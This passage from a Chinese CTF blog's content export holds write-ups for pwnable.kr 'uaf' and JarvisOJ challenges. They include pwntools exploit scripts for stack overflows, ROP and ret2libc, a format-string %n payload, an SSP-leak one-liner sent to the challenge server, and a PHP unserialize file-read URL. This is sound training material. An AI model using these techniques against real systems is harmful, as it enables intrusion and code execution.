class=\"string\">\"Jack\"</span>, <span class=\"number\">25</span>);</div><div class=\"line\">        Human* w = <span class=\"keyword\">new</span> Woman(<span class=\"string\">\"Jill\"</span>, <span class=\"number\">21</span>);</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">size_t</span> len;</div><div class=\"line\">        <span class=\"keyword\">char</span>* data;</div><div class=\"line\">        <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> op;</div><div class=\"line\">        <span class=\"keyword\">while</span>(<span class=\"number\">1</span>)&#123;</div><div class=\"line\">                <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"1. use\\n2. after\\n3. free\\n\"</span>;</div><div class=\"line\">                <span class=\"built_in\">cin</span> &gt;&gt; op;</div><div class=\"line\"></div><div class=\"line\">                <span class=\"keyword\">switch</span>(op)&#123;</div><div class=\"line\">                        <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</div><div class=\"line\">                                m-&gt;introduce();</div><div class=\"line\">                                w-&gt;introduce();</div><div class=\"line\">                                <span class=\"keyword\">break</span>;</div><div class=\"line\">                        <span class=\"keyword\">case</span> <span class=\"number\">2</span>:</div><div class=\"line\">                                len = atoi(argv[<span class=\"number\">1</span>]);</div><div class=\"line\">                                data = <span class=\"keyword\">new</span> <span class=\"keyword\">char</span>[len];</div><div class=\"line\">                                read(open(argv[<span class=\"number\">2</span>], O_RDONLY), data, len);</div><div class=\"line\">                                <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"your data is allocated\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">                                <span class=\"keyword\">break</span>;</div><div class=\"line\">                        <span class=\"keyword\">case</span> <span class=\"number\">3</span>:</div><div class=\"line\">                                <span class=\"keyword\">delete</span> m;</div><div class=\"line\">                                <span class=\"keyword\">delete</span> w;</div><div class=\"line\">                                <span class=\"keyword\">break</span>;</div><div class=\"line\">                        <span class=\"keyword\">default</span>:</div><div class=\"line\">                                <span class=\"keyword\">break</span>;</div><div class=\"line\">                &#125;</div><div class=\"line\">        &#125;</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<div class=\"note info\"><p>Points</p></div>\n<ul>\n<li>UAF利用</li>\n<li>C++虚函数的内存结构</li>\n</ul>\n<blockquote>\n<p>在C++中，每一个含有虚函数的类都会有一个虚函数表，简称虚表。与之对应的，每一个对象都会有其专属的虚表指针指向这个虚表。<br>值得一提的是，在一个继承树中，没有被覆写的虚函数虽然在被保存在不同的虚表中，但其地址是一致的。覆写后子类的虚表保存了覆写后的虚函数地址。<br>对象在内存开辟空间后，按照虚表指针、继承自基类的成员、类自身的成员的顺序进行存储。（如果是多重继承和虚继承，可能存在多个虚表指针）</p>\n</blockquote>\n<p>本题中m对象的内存结构示意图</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">+----------------+</div><div class=\"line\">|     vtable     |&lt;--------------------+</div><div class=\"line\">+----------------+                     |</div><div class=\"line\">|     age        |                     |</div><div class=\"line\">+----------------+                     |</div><div class=\"line\">|     ptr name   |                     |</div><div class=\"line\">+----------------+                     | </div><div class=\"line\">        ^                              |</div><div class=\"line\">        |                     +-----------------+</div><div class=\"line\">+----------------+            | humen::getshell |</div><div class=\"line\">|     \"Jack\"     |            +-----------------+</div><div class=\"line\">+----------------+            | men::introduce  |</div><div class=\"line\">                              +-----------------+</div></pre></td></tr></table></figure>\n<p>对应内存布局</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">gdb-peda$</span> x/10x 0x614c50</div><div class=\"line\">0x614c50:       0x0000000000401570      0x0000000000000019</div><div class=\"line\">0x614c60:       0x0000000000614c38      0x00000000000203a1</div><div class=\"line\">0x614c70:       0x0000000000000000      0x0000000000000000</div><div class=\"line\">0x614c80:       0x0000000000000000      0x0000000000000000</div><div class=\"line\">0x614c90:       0x0000000000000000      0x0000000000000000</div><div class=\"line\"><span class=\"meta\">gdb-peda$</span> x/10x 0x0000000000401570</div><div class=\"line\">0x401570 &lt;vtable for Man+16&gt;:   0x000000000040117a      0x00000000004012d2</div><div class=\"line\">0x401580 &lt;vtable for Human&gt;:    0x0000000000000000      0x00000000004015f0</div><div class=\"line\">0x401590 &lt;vtable for Human+16&gt;: 0x000000000040117a      0x0000000000401192</div><div class=\"line\">0x4015a0 &lt;typeinfo name for Woman&gt;:     0x00006e616d6f5735      0x0000000000000000</div><div class=\"line\">0x4015b0 &lt;typeinfo for Woman&gt;:  0x0000000000602390      0x00000000004015a0</div><div class=\"line\"><span class=\"meta\">gdb-peda$</span> x/10x 0x000000000040117a</div><div class=\"line\">0x40117a &lt;Human::give_shell()&gt;: 0x10ec8348e5894855      0x4014a8bff87d8948</div><div class=\"line\">0x40118a &lt;Human::give_shell()+16&gt;:      0xc3c9fffffb30e800      0xec834853e5894855</div><div class=\"line\">0x40119a &lt;Human::introduce()+8&gt;:        0x458b48e87d894818      0x14b0be10588d48e8</div><div class=\"line\">0x4011aa &lt;Human::introduce()+24&gt;:       0xe800602260bf0040      0x48de8948fffffb3a</div><div class=\"line\">0x4011ba &lt;Human::introduce()+40&gt;:       0xbefffffb6fe8c789      0xe8c7894800400d60</div><div class=\"line\"><span class=\"meta\">gdb-peda$</span> x/10x 0x00000000004012d2</div><div class=\"line\">0x4012d2 &lt;Man::introduce()&gt;:    0x10ec8348e5894855      0xf8458b48f87d8948</div><div class=\"line\">0x4012e2 &lt;Man::introduce()+16&gt;: 0xfffffea8e8c78948      0x2260bf004014cdbe</div><div class=\"line\">0x4012f2 &lt;Man::introduce()+32&gt;: 0xbefffff9f7e80060      0xe8c7894800400d60</div><div class=\"line\">0x401302 &lt;Man::introduce()+48&gt;: 0x4855c3c9fffffa4a      0x4828ec834853e589</div><div class=\"line\">0x401312 &lt;Woman::Woman(std::string, int)+10&gt;:   0x89e0758948e87d89      0x8948e8458b48dc55</div></pre></td></tr></table></figure>\n<ul>\n<li>利用<code>after</code>复写虚表位置(0x0000000000401570-0x8)使得下次<code>use</code>时调用的<code>introduce</code>函数指向<code>get_shell</code></li>\n</ul>\n<div class=\"note success\"><p>Exp</p></div>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">uaf@ubuntu:~$ python -c \"print '\\x68\\x15\\x40\\x00\\x00\\x00\\x00\\x00'\" &gt; /tmp/xuuaf                    </div><div class=\"line\">uaf@ubuntu:~$ ./uaf 24 /tmp/xuuaf                                                                  </div><div class=\"line\">1. use                                                                                             </div><div class=\"line\">2. after                                                                                           </div><div class=\"line\">3. free                                                                                            </div><div class=\"line\">3                                                                                                  </div><div class=\"line\">1. use                                                                                             </div><div class=\"line\">2. after                                                                                           </div><div class=\"line\">3. free                                                                                            </div><div class=\"line\">2                                                                                                  </div><div class=\"line\">your data is allocated                                                                             </div><div class=\"line\">1. use                                                                                             </div><div class=\"line\">2. after                                                                                           </div><div class=\"line\">3. free                                                                                            </div><div class=\"line\">2                                                                                                  </div><div class=\"line\">your data is allocated                                                                             </div><div class=\"line\">1. use                                                                                             </div><div class=\"line\">2. after                                                                                           </div><div class=\"line\">3. free                                                                                            </div><div class=\"line\">1                                                                                                  </div><div class=\"line\"><span class=\"meta\">$</span> ls                                                                                               </div><div class=\"line\">flag  uaf  uaf.cpp                                                                                 </div><div class=\"line\"><span class=\"meta\">$</span> cat flag</div></pre></td></tr></table></figure>\n<h2 id=\"codemap\"><a href=\"#codemap\" class=\"headerlink\" title=\"codemap\"></a>codemap</h2><h2 id=\"memcpy\"><a href=\"#memcpy\" class=\"headerlink\" title=\"memcpy\"></a>memcpy</h2><h2 id=\"asm\"><a href=\"#asm\" class=\"headerlink\" title=\"asm\"></a>asm</h2><h2 id=\"unlink\"><a href=\"#unlink\" class=\"headerlink\" title=\"unlink\"></a>unlink</h2><h2 id=\"brainfukc\"><a href=\"#brainfukc\" class=\"headerlink\" title=\"brainfukc\"></a>brainfukc</h2>","categories":["CTF","Writeup"],"tags":["Pwn"]},{"title":"JarvisOJ","url":"https://xuccc.github.io/CTF/Writeup/JarvisOJ/","content":"<h2 id=\"Pwn\"><a href=\"#Pwn\" class=\"headerlink\" title=\"Pwn\"></a>Pwn</h2><h3 id=\"XMAN-Level0\"><a href=\"#XMAN-Level0\" class=\"headerlink\" title=\"[XMAN]Level0\"></a>[XMAN]Level0</h3><p>程序中存在<code>callsystem</code>函数，栈溢出改返回地址即可</p>\n<div class=\"note info\"><p>Vuln:</p></div>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">ssize_t</span> vulnerable_function()</div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [sp+0h] [bp-80h]@1</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">return</span> read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">0x200</span>uLL);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<div class=\"note success\"><p>Exp:</p></div>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">pwn_file = <span class=\"string\">\"level0\"</span>  <span class=\"comment\"># pwn题文件</span></div><div class=\"line\">binary = ELF(pwn_file)</div><div class=\"line\"><span class=\"comment\">#libc = ELF('')</span></div><div class=\"line\"></div><div class=\"line\">context.terminal = [<span class=\"string\">'tmux'</span>, <span class=\"string\">'splitw'</span>, <span class=\"string\">'-h'</span>]</div><div class=\"line\"><span class=\"keyword\">if</span> args[<span class=\"string\">'REMOTE'</span>]:</div><div class=\"line\">    io = remote(<span class=\"string\">'127.0.0.1'</span>, <span class=\"number\">12345</span>)</div><div class=\"line\"><span class=\"keyword\">elif</span> <span class=\"string\">'-g'</span> <span class=\"keyword\">in</span> sys.argv[<span class=\"number\">1</span>:]:</div><div class=\"line\">\tio = process(pwn_file)</div><div class=\"line\">\tgdb.attach(io)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    io = process(pwn_file)</div><div class=\"line\"></div><div class=\"line\">offset = <span class=\"number\">136</span></div><div class=\"line\">address = binary.symbols[<span class=\"string\">'callsystem'</span>]</div><div class=\"line\"></div><div class=\"line\">io.recv()</div><div class=\"line\">payload = <span class=\"string\">'A'</span> * offset + p64(address)</div><div class=\"line\">io.send(payload)</div><div class=\"line\">io.interactive()</div></pre></td></tr></table></figure>\n<h3 id=\"XMAN-level2-x64\"><a href=\"#XMAN-level2-x64\" class=\"headerlink\" title=\"[XMAN]level2(x64)\"></a>[XMAN]level2(x64)</h3><div class=\"note info\"><p>Vuln:</p></div>    \n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">ssize_t</span> vulnerable_function()</div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [sp+0h] [bp-80h]@1</span></div><div class=\"line\"></div><div class=\"line\">  system(<span class=\"string\">\"echo Input:\"</span>);</div><div class=\"line\">  <span class=\"keyword\">return</span> read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">0x200</span>uLL);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<div class=\"note success\"><p>Exp:</p></div>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">pwn_file = <span class=\"string\">\"level2\"</span>  <span class=\"comment\"># pwn题文件</span></div><div class=\"line\">binary = ELF(pwn_file)</div><div class=\"line\"><span class=\"comment\">#libc = ELF('')</span></div><div class=\"line\"></div><div class=\"line\">context.terminal = [<span class=\"string\">'tmux'</span>, <span class=\"string\">'splitw'</span>, <span class=\"string\">'-h'</span>]</div><div class=\"line\"><span class=\"keyword\">if</span> args[<span class=\"string\">'REMOTE'</span>]:</div><div class=\"line\">    io = remote(<span class=\"string\">'pwn2.jarvisoj.com'</span>, <span class=\"number\">9882</span>)</div><div class=\"line\"><span class=\"keyword\">elif</span> <span class=\"string\">'-g'</span> <span class=\"keyword\">in</span> sys.argv[<span class=\"number\">1</span>:]:</div><div class=\"line\">\tio = process(pwn_file)</div><div class=\"line\">\tgdb.attach(io)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    io = process(pwn_file)</div><div class=\"line\"></div><div class=\"line\">offset = <span class=\"number\">136</span></div><div class=\"line\">binshAddress = <span class=\"number\">0x0000000000600a90</span></div><div class=\"line\">poprdi = <span class=\"number\">0x00000000004006b3</span></div><div class=\"line\">systemAddress = binary.plt[<span class=\"string\">'system'</span>]</div><div class=\"line\"></div><div class=\"line\">io.recv()</div><div class=\"line\">payload = <span class=\"string\">'A'</span> * offset + p64(poprdi) + p64(binshAddress) + p64(systemAddress)</div><div class=\"line\">io.send(payload)</div><div class=\"line\">io.interactive()</div></pre></td></tr></table></figure>\n<h3 id=\"XMAN-level3-x64\"><a href=\"#XMAN-level3-x64\" class=\"headerlink\" title=\"[XMAN]level3(x64)\"></a>[XMAN]level3(x64)</h3><div class=\"note info\"><p>Vuln:</p></div>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">ssize_t</span> vulnerable_function()</div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [sp+0h] [bp-80h]@1</span></div><div class=\"line\"></div><div class=\"line\">  write(<span class=\"number\">1</span>, <span class=\"string\">\"Input:\\n\"</span>, <span class=\"number\">7u</span>LL);</div><div class=\"line\">  <span class=\"keyword\">return</span> read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">0x200</span>uLL);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<div class=\"note success\"><p>Exp:</p></div>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><div class=\"line\">offset = <span class=\"number\">136</span></div><div class=\"line\"></div><div class=\"line\">vuln = binary.symbols[<span class=\"string\">'vulnerable_function'</span>]</div><div class=\"line\">writePlt = binary.plt[<span class=\"string\">'write'</span>]</div><div class=\"line\">writeGot = binary.got[<span class=\"string\">'write'</span>]</div><div class=\"line\">poprdi = <span class=\"number\">0x00000000004006b3</span></div><div class=\"line\">poprsi = <span class=\"number\">0x00000000004006b1</span></div><div class=\"line\"></div><div class=\"line\">io.recv()</div><div class=\"line\">payload = <span class=\"string\">'A'</span> * <span class=\"number\">136</span> + p64(poprdi) + p64(<span class=\"number\">1</span>) + p64(poprsi) + p64(writeGot) + p64(<span class=\"number\">0</span>) + p64(writePlt) + p64(vuln)</div><div class=\"line\">io.send(payload)</div><div class=\"line\"></div><div class=\"line\">writeAddress = u64(io.recv(<span class=\"number\">8</span>))</div><div class=\"line\">log.success(<span class=\"string\">'writeAddress:'</span> + hex(writeAddress))</div><div class=\"line\">io.recv()</div><div class=\"line\"></div><div class=\"line\">systemAddress = writeAddress + libc.symbols[<span class=\"string\">'system'</span>] - libc.symbols[<span class=\"string\">'write'</span>]</div><div class=\"line\">binshAddresss = writeAddress + libc.search(<span class=\"string\">'/bin/sh'</span>).next() - libc.symbols[<span class=\"string\">'write'</span>]</div><div class=\"line\">log.success(<span class=\"string\">'systemAddress:'</span> + hex(systemAddress))</div><div class=\"line\">log.success(<span class=\"string\">'binshAddress:'</span> + hex(binshAddresss))</div><div class=\"line\"></div><div class=\"line\">payload = <span class=\"string\">'A'</span> * offset + p64(poprdi) + p64(binshAddresss) + p64(systemAddress)</div><div class=\"line\">io.send(payload)</div><div class=\"line\">io.interactive()</div></pre></td></tr></table></figure>\n<h3 id=\"Test-Your-Memory\"><a href=\"#Test-Your-Memory\" class=\"headerlink\" title=\"Test Your Memory\"></a>Test Your Memory</h3><div class=\"note success\"><p>Exp:</p></div>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><div class=\"line\">offset = <span class=\"number\">23</span></div><div class=\"line\">vulnAddress = binary.symbols[<span class=\"string\">'mem_test'</span>]</div><div class=\"line\">winPlt = binary.symbols[<span class=\"string\">'win_func'</span>]</div><div class=\"line\"></div><div class=\"line\">io.recv()</div><div class=\"line\">payload = <span class=\"string\">''</span>.ljust(offset,<span class=\"string\">\"A\"</span>) + p32(winPlt) + p32(<span class=\"number\">0x80487e0</span>) + p32(<span class=\"number\">0x80487e0</span>) </div><div class=\"line\">io.sendline(payload)</div><div class=\"line\">io.interactive()</div></pre></td></tr></table></figure>\n<h3 id=\"Tell-Me-Somethine\"><a href=\"#Tell-Me-Somethine\" class=\"headerlink\" title=\"Tell Me Somethine\"></a>Tell Me Somethine</h3><div class=\"note success\"><p>Exp:</p></div>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><div class=\"line\">io = remote(<span class=\"string\">\"pwn.jarvisoj.com\"</span>,<span class=\"number\">9876</span>)</div><div class=\"line\"></div><div class=\"line\">payload = <span class=\"string\">'\\x00'</span>*<span class=\"number\">136</span> + p64(<span class=\"number\">0x0000000000400620</span>) </div><div class=\"line\"></div><div class=\"line\">io.recvuntil(<span class=\"string\">\"message:\\n\"</span>)</div><div class=\"line\">io.sendline(payload)</div><div class=\"line\"><span class=\"keyword\">print</span> sh.recv()</div></pre></td></tr></table></figure>\n<h3 id=\"Smashes\"><a href=\"#Smashes\" class=\"headerlink\" title=\"Smashes\"></a>Smashes</h3><div class=\"note info\"><p>Vuln:</p></div>\n<p>SSP(Stack Smashing Protector):</p>\n<p><code>__stack_chk_fail</code> 中的<code>__fortify_fail</code>在被触发栈保护时，会输出程序名称，这个参数从栈上得到，将此位置覆盖为flag地址即可输出flag的值.</p>\n<ul>\n<li><a href=\"https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/readme-200\" target=\"_blank\" rel=\"external\">32C3 CTF 2015 : readme</a></li>\n</ul>\n<p>PS:环境变量问题在攻击远程时并没有遇见，可能出题者忘记设置了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\">__<span class=\"function\">int64 <span class=\"title\">func</span><span class=\"params\">()</span></span></div><div class=\"line\"><span class=\"function\"></span>&#123;</div><div class=\"line\">  __int64 v0; <span class=\"comment\">// rax@1</span></div><div class=\"line\">  __int64 v1; <span class=\"comment\">// rbx@2</span></div><div class=\"line\">  <span class=\"keyword\">int</span> v2; <span class=\"comment\">// eax@3</span></div><div class=\"line\">  __int64 name; <span class=\"comment\">// [sp+0h] [bp-128h]@1</span></div><div class=\"line\">  __int64 canary; <span class=\"comment\">// [sp+108h] [bp-20h]@1</span></div><div class=\"line\">  canary = *MK_FP(__FS__, <span class=\"number\">40L</span>L);</div><div class=\"line\">  __printf_chk(<span class=\"number\">1L</span>L, <span class=\"string\">\"Hello!\\nWhat's your name? \"</span>);</div><div class=\"line\">  LODWORD(v0) = _IO_gets(&amp;name);</div><div class=\"line\">  <span class=\"keyword\">if</span> ( !v0 )</div><div class=\"line\">LABEL_9:</div><div class=\"line\">    _exit(<span class=\"number\">1</span>);</div><div class=\"line\">  v1 = <span class=\"number\">0L</span>L;</div><div class=\"line\">  __printf_chk(<span class=\"number\">1L</span>L, <span class=\"string\">\"Nice to meet you, %s.\\nPlease overwrite the flag: \"</span>);</div><div class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</div><div class=\"line\">  &#123;</div><div class=\"line\">    v2 = _IO_getc(<span class=\"built_in\">stdin</span>);</div><div class=\"line\">    <span class=\"keyword\">if</span> ( v2 == <span class=\"number\">-1</span> )</div><div class=\"line\">      <span class=\"keyword\">goto</span> LABEL_9;</div><div class=\"line\">    <span class=\"keyword\">if</span> ( v2 == <span class=\"number\">10</span> )</div><div class=\"line\">      <span class=\"keyword\">break</span>;</div><div class=\"line\">    byte_600D20[v1++] = v2;</div><div class=\"line\">    <span class=\"keyword\">if</span> ( v1 == <span class=\"number\">32</span> )</div><div class=\"line\">      <span class=\"keyword\">goto</span> LABEL_8;</div><div class=\"line\">  &#125;</div><div class=\"line\">  <span class=\"built_in\">memset</span>((<span class=\"keyword\">void</span> *)((<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)v1 + <span class=\"number\">6294816L</span>L), <span class=\"number\">0</span>, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)(<span class=\"number\">32</span> - v1));</div><div class=\"line\">LABEL_8:</div><div class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"Thank you, bye!\"</span>);</div><div class=\"line\">  <span class=\"keyword\">return</span> *MK_FP(__FS__, <span class=\"number\">40L</span>L) ^ canary;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<div class=\"note success\"><p>Exp:</p></div>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">root in ~/Desktop/tmp λ python -c 'print \"A\"*536 + \"\\x20\\x0d\\x40\\x00\\x00\\x00\\x00\\x00\" + \"\\n\" + \"A\"'|nc pwn.jarvisoj.com 9877</div><div class=\"line\">Hello!</div><div class=\"line\">What's your name? Nice to meet youdiv><div class=\"line\">Please overwrite the flag: Thank you, bye!</div><div class=\"line\">*** stack smashing detected ***: PCTF&#123;57dErr_Smasher_good_work!&#125; terminated</div></pre></td></tr></table></figure>\n<h3 id=\"Guess\"><a href=\"#Guess\" class=\"headerlink\" title=\"Guess\"></a>Guess</h3><p><a href=\"http://www.jianshu.com/p/40f846d14450\" target=\"_blank\" rel=\"external\">TODO</a></p>\n<h3 id=\"61dctf-fm\"><a href=\"#61dctf-fm\" class=\"headerlink\" title=\"[61dctf]fm\"></a>[61dctf]fm</h3><div class=\"note info\"><p>Vuln</p></div>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></div><div class=\"line\"><span class=\"function\"></span>&#123;</div><div class=\"line\">  <span class=\"keyword\">int</span> result; <span class=\"comment\">// eax@3</span></div><div class=\"line\">  <span class=\"keyword\">int</span> v4; <span class=\"comment\">// edx@3</span></div><div class=\"line\">  <span class=\"keyword\">int</span> v5; <span class=\"comment\">// [sp+2Ch] [bp-5Ch]@1</span></div><div class=\"line\">  <span class=\"keyword\">int</span> v6; <span class=\"comment\">// [sp+7Ch] [bp-Ch]@1</span></div><div class=\"line\"></div><div class=\"line\">  v6 = *MK_FP(__GS__, <span class=\"number\">20</span>);</div><div class=\"line\">  be_nice_to_people();</div><div class=\"line\">  <span class=\"built_in\">memset</span>(&amp;v5, <span class=\"number\">0</span>, <span class=\"number\">0x50</span>u);</div><div class=\"line\">  read(<span class=\"number\">0</span>, &amp;v5, <span class=\"number\">0x50</span>u);</div><div class=\"line\">  <span class=\"built_in\">printf</span>((<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *)&amp;v5);</div><div class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d!\\n\"</span>, x);</div><div class=\"line\">  <span class=\"keyword\">if</span> ( x == <span class=\"number\">4</span> )</div><div class=\"line\">  &#123;</div><div class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"running sh...\"</span>);</div><div class=\"line\">    system(<span class=\"string\">\"/bin/sh\"</span>);</div><div class=\"line\">  &#125;</div><div class=\"line\">  result = <span class=\"number\">0</span>;</div><div class=\"line\">  v4 = *MK_FP(__GS__, <span class=\"number\">20</span>) ^ v6;</div><div class=\"line\">  <span class=\"keyword\">return</span> result;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<div class=\"note success\"><p>Exp</p></div>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><div class=\"line\">payload = p32(<span class=\"number\">0x0804A02C</span>) + <span class=\"string\">\"%11$n\"</span></div><div class=\"line\">io.send(payload)</div><div class=\"line\">io.interactive()</div></pre></td></tr></table></figure>\n<h2 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h2><h3 id=\"神盾局的秘密\"><a href=\"#神盾局的秘密\" class=\"headerlink\" title=\"神盾局的秘密\"></a>神盾局的秘密</h3><p>文件读取，访问 <a href=\"http://web.jarvisoj.com:32768/showimg.php?img=c2hvd2ltZy5waHA=\" target=\"_blank\" rel=\"external\">http://web.jarvisoj.com:32768/showimg.php?img=c2hvd2ltZy5waHA=</a></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;?php</span></div><div class=\"line\">        $f = $_GET[<span class=\"string\">'img'</span>];</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($f)) &#123;</div><div class=\"line\">                $f = base64_decode($f);</div><div class=\"line\">                <span class=\"keyword\">if</span> (stripos($f,<span class=\"string\">'..'</span>)===<span class=\"keyword\">FALSE</span> &amp;&amp; stripos($f,<span class=\"string\">'/'</span>)===<span class=\"keyword\">FALSE</span> &amp;&amp; stripos($f,<span class=\"string\">'\\\\'</span>)===<span class=\"keyword\">FALSE</span></div><div class=\"line\">                &amp;&amp; stripos($f,<span class=\"string\">'pctf'</span>)===<span class=\"keyword\">FALSE</span>) &#123;     <span class=\"comment\">//stripos()查找字符串在另一串字符串中的位置</span></div><div class=\"line\">                        readfile($f);</div><div class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</div><div class=\"line\">                        <span class=\"keyword\">echo</span> <span class=\"string\">\"File not found!\"</span>;</div><div class=\"line\">               &#125;</div><div class=\"line\">       &#125;<span class=\"meta\">?&gt;</span>访问http:<span class=\"comment\">//web.jarvisoj.com:32768/showimg.php?img=aW5kZXgucGhw 读取index.php中函数<span class=\"meta\">&lt;?php</span></span></div><div class=\"line\">        <span class=\"keyword\">require_once</span>(<span class=\"string\">'shield.php'</span>);</div><div class=\"line\">  <span class=\"comment\">//require_once()语句在脚本执行期间包含并运行指定文件(通俗一点，括号内的文件会执行一遍)。</span></div><div class=\"line\">        $x = <span class=\"keyword\">new</span> Shield();</div><div class=\"line\">        <span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'class'</span>]) &amp;&amp; $g = $_GET[<span class=\"string\">'class'</span>];</div><div class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($g)) &#123;</div><div class=\"line\">                $x = unserialize($g);<span class=\"comment\">//unserialize() 将已序列化的字符串还原回 PHP 的值</span></div><div class=\"line\">        &#125;</div><div class=\"line\">        <span class=\"keyword\">echo</span> $x-&gt;readfile();</div><div class=\"line\"><span class=\"meta\">?&gt;</span></div></pre></td></tr></table></figure>\n<p>访问<a href=\"http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLnBocA==\" target=\"_blank\" rel=\"external\">http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLnBocA==</a></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;?php</span></div><div class=\"line\">        <span class=\"comment\">//flag is in pctf.php</span></div><div class=\"line\">        <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Shield</span> </span>&#123;</div><div class=\"line\">                <span class=\"keyword\">public</span> $file;</div><div class=\"line\">                <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($filename = <span class=\"string\">''</span>)</span> </span>&#123;</div><div class=\"line\">                        <span class=\"keyword\">$this</span> -&gt; file = $filename;</div><div class=\"line\">                &#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">//通常构造方法被用来执行一些有用的初始化任务，如对成员属性在创建对象时赋予初始值。//function __constrct([参数列表])&#123;//方法体//通常用来对成员属性进行初始化赋值//&#125;</span></div><div class=\"line\">                <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">readfile</span><span class=\"params\">()</span> </span>&#123;</div><div class=\"line\">                       <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>(<span class=\"keyword\">$this</span>-&gt;file) &amp;&amp; stripos(<span class=\"keyword\">$this</span>-&gt;file,<span class=\"string\">'..'</span>)===<span class=\"keyword\">FALSE</span></div><div class=\"line\">                       &amp;&amp; stripos(<span class=\"keyword\">$this</span>-&gt;file,<span class=\"string\">'/'</span>)===<span class=\"keyword\">FALSE</span> &amp;&amp; stripos(<span class=\"keyword\">$this</span>-&gt;file,<span class=\"string\">'\\\\'</span>)==<span class=\"keyword\">FALSE</span>) &#123;</div><div class=\"line\">                               <span class=\"keyword\">return</span> @file_get_contents(<span class=\"keyword\">$this</span>-&gt;file);</div><div class=\"line\">                       &#125;</div><div class=\"line\">               &#125;</div><div class=\"line\">       &#125;</div><div class=\"line\"><span class=\"meta\">?&gt;</span></div></pre></td></tr></table></figure>\n<p>pctf.php序列化值为 <code>O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></p>\n<p>访问 <a href=\"http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}\" target=\"_blank\" rel=\"external\">http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}</a></p>\n<h3 id=\"Login\"><a href=\"#Login\" class=\"headerlink\" 